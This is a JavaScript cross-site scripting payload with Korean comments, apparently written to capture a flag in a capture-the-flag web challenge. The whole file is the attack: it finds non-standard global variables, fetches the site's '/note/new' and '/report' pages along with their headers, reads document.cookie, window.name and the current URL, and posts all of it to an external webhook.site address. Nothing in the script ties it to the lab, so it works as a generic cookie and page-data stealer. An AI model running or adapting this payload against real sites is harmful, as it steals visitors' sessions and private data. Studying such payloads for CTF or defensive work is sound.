(async () => {
    // 1. 안정적인 로딩 대기
    await new Promise(r => setTimeout(r, 1500));

    // 2. 전역 변수 스캔 (window 객체에 "flag", "ctf", "admin" 등이 포함된 변수가 있는지)
    // 표준 window 속성이 아닌 것들만 추려냅니다.
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    const standardGlobals = Object.keys(iframe.contentWindow);
    document.body.removeChild(iframe);

    const currentGlobals = Object.keys(window);
    const customGlobals = {};
    
    currentGlobals.forEach(key => {
        if (!standardGlobals.includes(key) && key !== 'renderConfig' && key !== 'errorReporter') {
            try {
                customGlobals[key] = window[key];
            } catch(e) {}
        }
    });

    // 3. 다른 페이지들 소스 긁어오기
    const urlsToFetch = ['/note/new', '/report'];
    const pageSources = {};
    
    for (const url of urlsToFetch) {
        try {
            const res = await fetch(url);
            pageSources[url] = await res.text();
            // 혹시 헤더에 플래그가 있을 수도 있음
            const headers = {};
            for (const [k, v] of res.headers.entries()) {
                headers[k] = v;
            }
            pageSources[url + "_headers"] = JSON.stringify(headers);
        } catch (e) {
            pageSources[url] = "Error: " + e.toString();
        }
    }

    // 4. 데이터 전송
    let data = {
        msg: "Deep Scan Data",
        // 1. 쿠키 재확인 (혹시 타이밍 문제였을까봐)
        cookie: document.cookie,
        // 2. window.name 확인 (CTF 단골 은닉처)
        windowName: window.name,
        // 3. 의심스러운 전역 변수들 (여기에 window.FLAG가 있을 확률 높음)
        customGlobals: JSON.stringify(customGlobals),
        // 4. 다른 페이지 소스들
        pages: pageSources,
        // 5. 현재 URL
        location: window.location.href
    };

    fetch('https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data)
    });
})();
